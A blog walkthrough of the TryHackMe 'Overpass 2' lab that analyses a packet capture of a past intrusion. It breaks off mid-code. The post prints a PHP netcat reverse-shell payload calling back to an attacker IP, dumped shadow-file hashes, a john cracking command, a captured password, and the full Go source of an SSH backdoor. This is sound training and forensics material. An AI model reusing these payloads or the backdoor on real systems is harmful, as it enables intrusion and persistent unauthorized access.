@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="i&amp;rsquo;m going to talk about one of my favourite rooms on thm, and that is overpass 2. overpass 2 is the 7th room in the &amp;ldquo;advanced exploitation&amp;rdquo; chapter, of the &amp;ldquo;offensive pentesting&amp;rdquo; path. it&amp;rsquo;s also the 2nd room in the overpass series, which is about a bunch of computer science students trying to run a company called &amp;ldquo;overpass&amp;rdquo;.
+this room is interesting and different because the &amp;ldquo;target&amp;rdquo; in question has already been hacked, and it&amp;rsquo;s our job to figure out how and if we can use the information left behind by the attacker to get back into the overpass network." />
+<meta name="keywords" content=", cybersec, tryhackme, walkthrough, pentesting, wireshark" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/posts/2021/10/tryhackme-overpass2/" />
+
+
+    <title>
+        
+            tryhackme: overpass2 ::  
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="/main.b78c3be9451dc4ca61ca377f3dc2cf2e6345a44c2bae46216a322ef366daa399.css" integrity="sha256-t4w76UUdxMphyjd/PcLPLmNFpEwrrkYhajIu82bao5k=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="tryhackme: overpass2">
+<meta itemprop="description" content="i&rsquo;m going to talk about one of my favourite rooms on thm, and that is overpass 2. overpass 2 is the 7th room in the &ldquo;advanced exploitation&rdquo; chapter, of the &ldquo;offensive pentesting&rdquo; path. it&rsquo;s also the 2nd room in the overpass series, which is about a bunch of computer science students trying to run a company called &ldquo;overpass&rdquo;.
+this room is interesting and different because the &ldquo;target&rdquo; in question has already been hacked, and it&rsquo;s our job to figure out how and if we can use the information left behind by the attacker to get back into the overpass network."><meta itemprop="datePublished" content="2021-10-27T16:16:04+04:00" />
+<meta itemprop="dateModified" content="2021-10-27T16:16:04+04:00" />
+<meta itemprop="wordCount" content="1289"><meta itemprop="image" content=""/>
+<meta itemprop="keywords" content="cybersec,tryhackme,walkthrough,pentesting,wireshark," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content=""/>
+
+<meta name="twitter:title" content="tryhackme: overpass2"/>
+<meta name="twitter:description" content="i&rsquo;m going to talk about one of my favourite rooms on thm, and that is overpass 2. overpass 2 is the 7th room in the &ldquo;advanced exploitation&rdquo; chapter, of the &ldquo;offensive pentesting&rdquo; path. it&rsquo;s also the 2nd room in the overpass series, which is about a bunch of computer science students trying to run a company called &ldquo;overpass&rdquo;.
+this room is interesting and different because the &ldquo;target&rdquo; in question has already been hacked, and it&rsquo;s our job to figure out how and if we can use the information left behind by the attacker to get back into the overpass network."/>
+
+
+
+    <meta property="og:title" content="tryhackme: overpass2" />
+<meta property="og:description" content="i&rsquo;m going to talk about one of my favourite rooms on thm, and that is overpass 2. overpass 2 is the 7th room in the &ldquo;advanced exploitation&rdquo; chapter, of the &ldquo;offensive pentesting&rdquo; path. it&rsquo;s also the 2nd room in the overpass series, which is about a bunch of computer science students trying to run a company called &ldquo;overpass&rdquo;.
+this room is interesting and different because the &ldquo;target&rdquo; in question has already been hacked, and it&rsquo;s our job to figure out how and if we can use the information left behind by the attacker to get back into the overpass network." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/2021/10/tryhackme-overpass2/" /><meta property="og:image" content=""/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-10-27T16:16:04+04:00" />
+<meta property="article:modified_time" content="2021-10-27T16:16:04+04:00" />
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-10-27 16:16:04 &#43;0400 &#43;0400" />
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                # cd /home/</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#fa8072;
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">about</a></li><li><a href="/cv/">cv</a></li><li><a href="/posts/">posts</a></li><li><a href="/photography/">photography</a></li>
+    </ul>
+</nav>
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        7 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="/posts/2021/10/tryhackme-overpass2/">tryhackme: overpass2</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <p>i&rsquo;m going to talk about one of my favourite rooms on thm, and that is overpass 2. overpass 2 is the 7th room in the &ldquo;advanced exploitation&rdquo; chapter, of the &ldquo;offensive pentesting&rdquo; path. it&rsquo;s also the 2nd room in the overpass series, which is about a bunch of computer science students trying to run a company called &ldquo;overpass&rdquo;.</p>
+<p>this room is interesting and different because the &ldquo;target&rdquo; in question has already been hacked, and it&rsquo;s our job to figure out how and if we can use the information left behind by the attacker to get back into the overpass network.</p>
+<p><img src="/overpass-cooctus.png" alt="cooctus"></p>
+<p>the overpass SOC team managed to capture the packets in wireshark during the attack, and save them as a .pcap file. we&rsquo;ve been given the .pcap file to analyze, so let&rsquo;s go ahead and do that.</p>
+<p><img src="/overpass-pcap.png" alt=".pcap"></p>
+<p>this is what we first see when we open the file in wireshark. it&rsquo;s a lot of information, but we can see a bunch of TCP and HTTP requests made from a source (192.168.170.145) to a destination (192.168.170.159).</p>
+<p>let&rsquo;s set a display filter so we only see the HTTP requests. we can do this by entering <code>http</code> in the &ldquo;apply a display filter&rdquo; field.</p>
+<p><img src="/overpass-pcap2.png" alt="pcap2"></p>
+<p>we can see that the source (attacker?) requested the /development/ URL. the first packet has the <code>GET /development/</code> request header. the server responds, and then the source makes a POST request to an upload form of sorts (header <code>POST /development/upload.php</code>).</p>
+<p>if we right-click on the packet, and click &ldquo;follow TCP stream&rdquo;, it will show us the information that was contained within that packet.</p>
+<p><img src="/overpass-tcpstream.png" alt="stream"></p>
+<p>we can see that the source/attacker uploaded a .php file called &ldquo;payload.php&rdquo;. doesn&rsquo;t leave much to the imagination, does it? right under that, we can see the payload&rsquo;s code in clear text:</p>
+<pre tabindex="0"><code>&lt;?php exec(&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f&#34;)?&gt;
+</code></pre><p>this script would have created a php reverse shell, which the attacker would control using netcat. the shell would have connected to port 4242.</p>
+<p>the good (and bad) thing about using netcat to control reverse shells is that all the traffic is unencrypted, and should be visible in stream data that is captured.</p>
+<p>let&rsquo;s apply a TCP stream filter to see the contents of the traffic. in the display filter field, type <code>tcp.stream eq 3</code>.</p>
+<p><img src="/overpass-tcpstream2.png" alt="stream2"></p>
+<p><img src="/overpass-tcpstream3.png" alt="stream2"></p>
+<p>this stream has captured all the traffic that was traveling through the attacker&rsquo;s shell. we can see that they logged in as a low privilege user &ldquo;james&rdquo; and used the password &ldquo;whenevernoteartinstant&rdquo;. attacker then runs <code>sudo -l</code> to see what commands james can run, and turns out james can run pretty much anything. this means that james isn&rsquo;t exactly a low privilege user!</p>
+<p>the attacker then dumps the contents of the /etc/shadow file. this file, as you may know, contains all the secure user account information. it stores actual passwords&rsquo; hashes. we can see that some user hashes were dumped as well:</p>
+<pre tabindex="0"><code>james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
+paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
+szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
+bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
+muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
+</code></pre><p>we can attempt to crack these hashes using john. first, let&rsquo;s identify the hashes. you can use any tool you prefer. i used the hash-identifier tool on my machine. hopefully, you will be able to identify it as sha512crypt.</p>
+<p>save the hashes to a file, and run john to crack them using the following command:</p>
+<pre tabindex="0"><code>john -w=/usr/share/wordlists/fasttrack.txt --format=crypt systemhashes.txt
+</code></pre><p><img src="/overpass-john.png" alt="john"></p>
+<p>we were able to crack 4 users&rsquo; passwords.</p>
+<p>right after dumping the hashes, the attacker then tries to establish persistence via an SSH backdoor. they cloned a repo from github, known as <a href="https://github.com/NinjaJc01/ssh-backdoor">ssh-backdoor</a>. they then generate a public/private key pair. the attacker modifies the permissions on the backdoor using <code>chmod +x backdoor</code> and then login to it using:</p>
+<pre tabindex="0"><code>./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
+</code></pre><p>the backdoor connects over the port 2222.</p>
+<p>let&rsquo;s visit the github repo above and try to analyze the main code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;crypto/sha512&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;io&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;io/ioutil&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;os/exec&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/creack/pty&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/gliderlabs/ssh&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/integrii/flaggy&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">gossh</span> <span style="color:#e6db74">&#34;golang.org/x/crypto/ssh&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;golang.org/x/crypto/ssh/terminal&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hash</span> <span style="color:#66d9ef">string</span> = <span style="color:#e6db74">&#34;bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> (
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">lport</span>       <span style="color:#66d9ef">uint</span>   = <span style="color:#ae81ff">2222</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">lhost</span>       <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">IP</span> = <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">ParseIP</span>(<span style="color:#e6db74">&#34;0.0.0.0&#34;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">keyPath</span>     <span style="color:#66d9ef">string</span> = <span style="color:#e6db74">&#34;id_rsa&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fingerprint</span> <span style="color:#66d9ef">string</span> = <span style="color:#e6db74">&#34;OpenSSH_8.2p1 Debian-4&#34;</span>
+</span></span><span style="display:flex;"><span>	)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flaggy</span>.<span style="color:#a6e22e">UInt</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">lport</span>, <span style="color:#e6db74">&#34;p&#34;</span>, <span style="color:#e6db74">&#34;port&#34;</span>, <span style="color:#e6db74">&#34;Local port to listen for SSH on&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flaggy</span>.<span style="color:#a6e22e">IP</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">lhost</span>, <span style="color:#e6db74">&#34;i&#34;</span>, <span style="color:#e6db74">&#34;interface&#34;</span>, <span style="color:#e6db74">&#34;IP address for the interface to listen on&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flaggy</span>.<span style="color:#a6e22e">String</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">keyPath</span>, <span style="color:#e6db74">&#34;k&#34;</span>, <span style="color:#e6db74">&#34;key&#34;</span>, <span style="color:#e6db74">&#34;Path to private key for SSH server&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flaggy</span>.<span style="color:#a6e22e">String</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">fingerprint</span>, <span style="color:#e6db74">&#34;f&#34;</span>, <span style="color:#e6db74">&#34;fingerprint&#34;</span>, <span style="color:#e6db74">&#34;SSH Fingerprint, excluding the SSH-2.0- prefix&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flaggy</span>.<span style="color:#a6e22e">String</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">hash</span>, <span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#e6db74">&#34;hash&#34;</span>, <span style="color:#e6db74">&#34;Hash for backdoor&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flaggy</span>.<span style="color:#a6e22e">Parse</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">SetPrefix</span>(<span style="color:#e6db74">&#34;SSH - &#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">privKeyBytes</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">ReadFile</span>(<span style="color:#a6e22e">keyPath</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Panicln</span>(<span style="color:#e6db74">&#34;Error reading privkey:\t&#34;</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">privateKey</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">gossh</span>.<span style="color:#a6e22e">ParsePrivateKey</span>(<span style="color:#a6e22e">privKeyBytes</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Panicln</span>(<span style="color:#e6db74">&#34;Error parsing privkey:\t&#34;</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">server</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">ssh</span>.<span style="color:#a6e22e">Server</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Addr</span>:            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;%s:%v&#34;</span>, <span style="color:#a6e22e">lhost</span>.<span style="color:#a6e22e">String</span>(), <span style="color:#a6e22e">lport</span>),
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Handler</span>:         <span style="color:#a6e22e">sshterminal</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Version</span>:         <span style="color:#a6e22e">fingerprint</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">PasswordHandler</span>: <span style="color:#a6e22e">passwordHandler</span>,
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">AddHostKey</span>(<span style="color:#a6e22e">privateKey</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Started SSH backdoor on&#34;</span>, <span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">Addr</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">ListenAndServe</span>())
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">verifyPass</span>(<span style="color:#a6e22e">hash</span>, <span style="color:#a6e22e">salt</span>, <span style="color:#a6e22e">password</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">bool</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">resultHash</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">hashPassword</span>(<span style="color:#a6e22e">password</span>, <span style="color:#a6e22e">salt</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">resultHash</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">hash</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">hashPassword</span>(<span style="color:#a6e22e">password</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">salt</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">string</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">hash</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">sha512</span>.<span style="color:#a6e22e">Sum512</span>([]byte(<span style="color:#a6e22e">password</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">salt</span>))
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;%x&#34;</span>, <span style="color:#a6e22e">hash</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">sshHandler</span>(<span style="color:#a6e22e">s</span> <span style="color:#a6e22e">ssh</span>.<span style="color:#a6e22e">Session</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">command</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">RawCommand</span>()
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">command</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">runCommand</span>(<span style="color:#a6e22e">command</span>))
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">term</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">terminal</span>.<span style="color:#a6e22e">NewTerminal</span>(<span style="color:#a6e22e">s</span>, <span style="color:#e6db74">&#34;$ &#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">command</span>, <span style="color:#a6e22e">_</span> = <span style="color:#a6e22e">term</span>.<span style="color:#a6e22e">ReadLine</span>()
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">command</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;exit&#34;</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">term</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">runCommand</span>(<span style="color:#a6e22e">command</span>))
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">sshterminal</span>(<span style="color:#a6e22e">s</span> <span style="color:#a6e22e">ssh</span>.<span style="color:#a6e22e">Session</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;-i&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ptyReq</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">isPty</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">Pty</span>()
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">isPty</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Env</span> = append(<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Env</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;TERM=%s&#34;</span>, <span style="color:#a6e22e">ptyReq</span>.<span style="color:#a6e22e">Term</span>))
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">f</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">pty</span>.<span style="color:#a6e22e">Start</span>(<span style="color:#a6e22e">cmd</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>			panic(<span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>() {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Copy</span>(<span style="color:#a6e22e">f</span>, <span style="color:#a6e22e">s</span>) <span style="color:#75715e">// stdin
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		}()
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Copy</span>(<span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">f</span>) <span style="color:#75715e">// stdout
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Wait</span>()
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">WriteString</span>(<span style="color:#a6e22e">s</span>, <span style="color:#e6db74">&#34;No PTY requested.\n&#34;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">Exit</span>(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">runCommand</span>(<span style="color:#a6e22e">cmd</span> <span style="color:#66d9ef">string</span>) []<span style="color:#66d9ef">byte</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">result</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#a6e22e">cmd</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">response</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">CombinedOutput</span>()
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">response</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">passwordHandler</span>(<span style="color:#a6e22e">_</span> <span style="color:#a6e22e">ssh</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">password</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">bool</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">verifyPass</span>(<span style="color:#a6e22e">hash</span>, <span style="color:#e6db74">&#34;1c362db832f3f864c8c2fe05f2002a05&#34;</span>, <span style="color:#a6e22e">password</span>)
+</span></span></code></pre></div><p>we can see that the program first assigns a default hash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hash</span> <span style="color:#66d9ef">string</span> = <span style="color:#e6db74">&#34;bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3&#34;</span>
+</span></span></code></pre></div><p>as we proceed further, there&rsquo;s a function called <code>verifyPass</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">verifyPass</span>(<span style="color:#a6e22e">hash</span>, <span style="color:#a6e22e">salt</span>, <span style="color:#a6e22e">password</span> <span style="color:#66d9ef">string</span>)
+</span></span></code></pre></div><p>towards the bottom of the program, we see that a hardcoded salt is passed to the function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">passwordHandler</span>(<span style="color:#a6e22e">_</span> <span style="color:#a6e22e">ssh</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">password</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">bool</span> {
